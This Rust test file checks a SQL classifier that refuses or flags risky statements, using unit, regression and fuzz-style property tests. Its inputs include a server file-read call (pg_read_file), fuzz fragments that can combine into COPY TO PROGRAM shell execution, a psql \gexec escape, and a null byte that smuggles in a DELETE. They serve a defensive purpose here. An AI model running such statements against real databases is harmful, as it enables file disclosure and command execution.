fn a_refused_statement_refuses_the_whole_input() {
    let text = "SELECT 1; SELECT pg_read_file('x'); SELECT 2";
    let u = run(text).unwrap_err();
    assert_eq!(u.statement_index, Some(1));
    assert_eq!(&text[u.span.clone().unwrap()], "SELECT pg_read_file('x')");
    // classify_each reports each statement.
    let each = classify_each(Dialect::PostgreSql, pg(true), text, &ctx()).unwrap();
    assert_eq!(each.iter().map(Result::is_ok).collect::<Vec<_>>(), [true, false, true]);
}

#[test]
fn limits_and_invalid_input() {
    assert!(run("").unwrap().is_empty());
    assert!(run(" ;; -- nothing\n /* at all */ ;").unwrap().is_empty());
    let whole = |text: &str| run(text).unwrap_err();
    assert_eq!(whole(&"x".repeat(MAX_TEXT_BYTES + 1)).reason, Reason::InputTooLarge);
    assert_eq!(whole(&"SELECT 1;".repeat(MAX_STATEMENTS + 1)).reason, Reason::TooManyStatements);
    assert_eq!(whole("SELECT 1\0; DELETE FROM t").reason, Reason::ControlCharacter);
    assert_eq!(whole("SELECT 1 \\gexec").reason, Reason::InvalidCharacter);
    let deep = format!("SELECT {}1{}", "(".repeat(MAX_NESTING + 1), ")".repeat(MAX_NESTING + 1));
    refused(&deep, Reason::NestingTooDeep, Refusal::Never);
    let bad = NameContext { current_catalog: String::new(), ..ctx() };
    assert_eq!(run_in("SELECT 1", true, &bad).unwrap_err().reason, Reason::InvalidContext);
}

/// Security regression: sqlparser reads `DELETE FROM ONLY t` as table
/// `only` aliased `t`. With a quoted table `"only"` in reach, a caller
/// allowed to delete from it would have deleted from `t`. An unquoted
/// reserved word is never a table name to the server, so it is refused.
#[test]
fn regression_reserved_word_parsed_as_a_name_is_refused() {
    for text in [
        "DELETE FROM ONLY t WHERE a = 1",
        "SELECT * FROM ONLY t",
        "UPDATE ONLY t SET a = 1",
        "INSERT INTO t SELECT * FROM ONLY u",
    ] {
        match run(text) {
            Err(u) => assert_eq!(u.refusal, Refusal::Unknown, "{text:?}: {u:?}"),
            Ok(v) => {
                // Accepted only if the parser understood ONLY and named `t`/`u`.
                for s in &v {
                    assert!(render(s).iter().all(|r| !r.ends_with(".only")), "{text:?}: {s:?}");
                }
            }
        }
    }
    refused("DELETE FROM ONLY t WHERE a = 1", Reason::ReservedWordAsName, Refusal::Unknown);
    // Quoted, it is an ordinary name.
    requires("DELETE FROM \"only\"", &["sql_delete rel:?.only"]);
    // SQL value functions are reserved words the grammar calls as functions.
    requires("SELECT current_user, session_user, current_date, localtimestamp", &["sql_select server"]);
}

/// Deep nesting must never overflow a stack: the parser's frames are large
/// in an unoptimised build, so classification runs on its own sized stack.
/// These inputs overflowed a 2 MiB test thread before that.
#[test]
fn deep_nesting_is_classified_or_refused_without_overflow() {
    let cases = [
        format!("SELECT {}1{}", "(".repeat(MAX_NESTING), ")".repeat(MAX_NESTING)),
        format!("SELECT {}1", "- ".repeat(500)),
        format!("SELECT {} true", "NOT ".repeat(60)),
        format!("SELECT {} true", "NOT ".repeat(5000)),
        format!("SELECT {} 1 {}", "CASE WHEN true THEN ".repeat(40), "END ".repeat(40)),
        format!("SELECT {} 1 {}", "CASE WHEN true THEN ".repeat(2000), "END ".repeat(2000)),
        format!("SELECT * FROM {} t {}", "(SELECT * FROM ".repeat(MAX_NESTING), ") x".repeat(MAX_NESTING)),
        format!("SELECT {}1{}", "(SELECT ".repeat(MAX_NESTING), ")".repeat(MAX_NESTING)),
        format!("SELECT 1 {}", "UNION SELECT 1 ".repeat(2000)),
        format!("SELECT {}", vec!["a"; 20000].join(" AND ")),
    ];
    for text in &cases {
        check_invariants(text, &run(text));
    }
    // Past the parser's budget: refused, not truncated.
    assert!(run(&cases[3]).is_err());
}

// ---------------------------------------------------------------------------
// Property tests (Phase 2): every input yields classified statements with a
// non-empty requirement set, or Unclassifiable; transaction control is the
// only exemption.
// ---------------------------------------------------------------------------

/// The invariants the fuzz target also asserts.
pub(crate) fn check_invariants(text: &str, result: &Result<Vec<ClassifiedStatement>, Unclassifiable>) {
    match result {
        Ok(statements) => {
            let mut last_end = 0;
            for s in statements {
                assert!(s.tx_control || !s.required.is_empty(), "empty requirement set: {s:?}");
                assert!(s.span.start >= last_end && s.span.start < s.span.end && s.span.end <= text.len());
                assert!(text.is_char_boundary(s.span.start) && text.is_char_boundary(s.span.end));
                let body = &text[s.span.clone()];
                assert_eq!(body, body.trim(), "spans are trimmed");
                assert!(!body.ends_with(';'));
                assert!(s.required.windows(2).all(|w| w[0] < w[1]), "sorted and deduplicated");
                assert!(s.required.iter().all(|(c, _)| !matches!(c, SqlCapability::Export | SqlCapability::Script)));
                last_end = s.span.end;
            }
        }
        Err(u) => {
            if u.refusal == Refusal::Unknown {
                assert!(u.span.is_some(), "Unknown without a span: {u:?}");
            }
            if let Some(span) = &u.span {
                assert!(span.start < span.end && span.end <= text.len());
            }
        }
    }
}

mod props {
    use proptest::prelude::*;

    use super::*;

    /// Cases per property: 2,000 by default; `BV_SQL_CLASSIFY_CASES` raises
    /// it for a longer soak.
    fn cases() -> u32 {
        std::env::var("BV_SQL_CLASSIFY_CASES").ok().and_then(|v| v.parse().ok()).unwrap_or(2000)
    }

    const FRAGMENTS: &[&str] = &[
        "SELECT",
        "INSERT",
        "INTO",
        "UPDATE",
        "DELETE",
        "FROM",
        "WHERE",
        "WITH",
        "AS",
        "SET",
        "VALUES",
        "RETURNING",
        "CREATE",
        "TABLE",
        "DROP",
        "ALTER",
        "BEGIN",
        "COMMIT",
        "END",
        "DO",
        "COPY",
        "TO",
        "STDOUT",
        "PROGRAM",
        "EXPLAIN",
        "ANALYZE",
        "FOR",
        "UPDATE",
        "LOCK",
        "GRANT",
        "CALL",
        "EXECUTE",
        "PREPARE",
        "TRUNCATE",
        "MERGE",
        "USING",
        "ON",
        "CONFLICT",
        "NOTHING",
        "RESET",
        "ALL",
        "DISCARD",
        "LANGUAGE",
        "FUNCTION",
        "VIEW",
        "t",
        "u",
        "public.t",
        "\"T\"",
        "\"a\"\"b\"",
        "nextval('s')",
        "pg_read_file('x')",
        "f(1)",
        "count(*)",
        "1",
        "0x1F",
        "1e5",
        ".5",
        "$1",
        "'a'",
        "'a''b'",
        "E'\\''",
        "B'01'",
        "X'1F'",
        "N'n'",
        "$$x$$",
        "$t$y$t$",
        "-- c\n",
        "/* c */",
        "/* /* n */ */",
        ";",
        ",",
        "(",
        ")",
        "[",
        "]",
        "*",
        "=",
        "+",
        "-",
        "||",
        "::",
        ".",
        " ",
        "\n",
        "\r",
        "\t",
        "'",
        "\"",
        "$",
        "\\",
        "/*",
        "--",
        "U&'x'",
        "standard_conforming_strings",
        "search_path",
        "off",
    ];

    fn soup() -> impl Strategy<Value = String> {
        prop::collection::vec(prop::sample::select(FRAGMENTS), 0..40).prop_map(|v| v.join(" "))
    }

    fn glued_soup() -> impl Strategy<Value = String> {
        prop::collection::vec(prop::sample::select(FRAGMENTS), 0..40).prop_map(|v| v.concat())
    }

    fn backslash_free_soup() -> impl Strategy<Value = String> {
        let fragments: Vec<&str> = FRAGMENTS.iter().copied().filter(|f| !f.contains('\\')).collect();
        prop::collection::vec(prop::sample::select(fragments), 0..40).prop_map(|v| v.concat())
    }

    proptest! {
        #![proptest_config(ProptestConfig { cases: cases(), ..ProptestConfig::default() })]

        #[test]
        fn arbitrary_text_holds_the_invariants(text in any::<String>(), scs in any::<bool>()) {
            check_invariants(&text, &run_in(&text, scs, &ctx()));
        }

        #[test]
        fn sql_soup_holds_the_invariants(text in soup(), scs in any::<bool>()) {
            check_invariants(&text, &run_in(&text, scs, &ctx()));
        }

        #[test]
        fn glued_sql_soup_holds_the_invariants(text in glued_soup(), scs in any::<bool>()) {
            check_invariants(&text, &run_in(&text, scs, &ctx()));
        }

        #[test]
        fn classification_is_deterministic(text in soup()) {
            prop_assert_eq!(run(&text), run(&text));
        }

        /// Without a backslash, `standard_conforming_strings` cannot matter.
        #[test]
        fn backslash_free_text_ignores_the_setting(text in backslash_free_soup()) {
            prop_assert_eq!(run_in(&text, true, &ctx()), run_in(&text, false, &ctx()));
        }

        /// Statements joined by `;` with comments between come back as
        /// exactly those statements.
        #[test]
        fn spans_are_the_statements(
            picks in prop::collection::vec(0usize..8, 1..12),
            seps in prop::collection::vec(prop::sample::select(&[";", " ; ", ";\n-- c\n", "; /* x; */ ", ";;"][..]), 12),
        ) {
            const STATEMENTS: [&str; 8] = [
                "SELECT 1", "SELECT 'a;b' FROM t", "DELETE FROM t WHERE a = $$;$$", "UPDATE t SET a = 1",
                "INSERT INTO t VALUES (';')", "BEGIN", "SELECT \"x;\" FROM u /* ; */ WHERE b = 2", "COMMIT",
            ];
            let mut text = String::new();
            for (i, p) in picks.iter().enumerate() {
                text.push_str(STATEMENTS[*p]);
                text.push_str(seps[i]);
            }
            let each = classify_each(Dialect::PostgreSql, pg(true), &text, &ctx()).unwrap();
            let spans: Vec<&str> = each
                .iter()
                .map(|r| match r {
                    Ok(s) => &text[s.span.clone()],
                    Err(u) => &text[u.span.clone().unwrap()],
                })
                .collect();
            let want: Vec<&str> = picks.iter().map(|p| STATEMENTS[*p]).collect();
            prop_assert_eq!(spans, want);
        }
    }
}
